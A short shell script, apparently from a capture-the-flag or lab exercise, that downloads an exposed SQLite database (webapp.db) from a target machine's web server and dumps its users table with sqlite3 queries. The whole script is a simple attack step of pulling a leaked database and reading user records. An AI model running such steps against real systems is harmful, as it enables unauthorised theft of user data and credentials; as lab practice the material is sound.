#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.210.85"
attack_ip="10.10.30.237"

# Prepare environment
mkdir /work/

# Collect database content from assets directory (look at the page source code)
wget http://$target_ip:81/assets/webapp.db
mv webapp.db /work/webapp.db

# Use sqlite3 to gather content
# Perform the query
sqlite3 /work/webapp.db ".tables"
sqlite3 /work/webapp.db "PRAGMA table_info(users)"
sqlite3 /work/webapp.db "SELECT * FROM users;"
